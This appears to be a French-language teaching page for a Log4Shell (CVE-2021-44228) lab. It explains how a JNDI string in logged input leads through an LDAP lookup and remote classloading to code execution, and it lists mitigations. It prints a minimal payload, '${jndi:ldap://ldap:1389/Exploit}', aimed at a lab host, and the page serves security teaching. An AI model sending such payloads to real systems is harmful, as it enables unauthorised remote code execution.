Avant de cliquer sur “launch attack”, cette page donne à l’étudiant une lecture claire de la mécanique Log4Shell: l’entrée utilisateur, le lookup JNDI, le relais LDAP puis le chargement HTTP du bytecode malveillant.

CVE-2021-44228 | CVSS 10.0

Pourquoi Log4Shell est critique

Log4j 2 acceptait des expressions comme ${jndi:...} dans les chaînes journalisées. Si une donnée utilisateur arrivait dans les logs sans filtrage, l’application pouvait initier un lookup distant et charger du code non fiable.

  • Exploitation sans authentification.
  • Impact RCE à distance.
  • Très faible friction pour l’attaquant.

Payload minimal

Le point d’entrée classique du lab est un header HTTP qui contient la chaîne JNDI malveillante.

${jndi:ldap://ldap:1389/Exploit}

Dans le lab, cette expression déclenche une requête LDAP. Le serveur LDAP renvoie ensuite une référence vers la classe Java servie par le serveur HTTP attaquant.

Défense et lecture critique

Un bon lab ne sert pas seulement à “faire marcher l’attaque”, mais à comprendre pourquoi la mitigation a finalement consisté à couper les lookups et à mettre à jour Log4j.
  • Mettre Log4j à jour vers une version corrigée.
  • Supprimer ou désactiver les lookups JNDI.
  • Limiter les flux sortants réseau côté application.

Chaîne d’exploitation

1
Injection

Le payload arrive via une donnée contrôlée par l’utilisateur.

2
Logging

Log4j parse la chaîne et voit l’expression JNDI.

3
LDAP

La JVM contacte le serveur de naming choisi par l’attaquant.

4
HTTP Classload

Le serveur LDAP renvoie une référence vers une classe Java distante.

5
RCE

Le code est chargé puis exécuté côté cible.
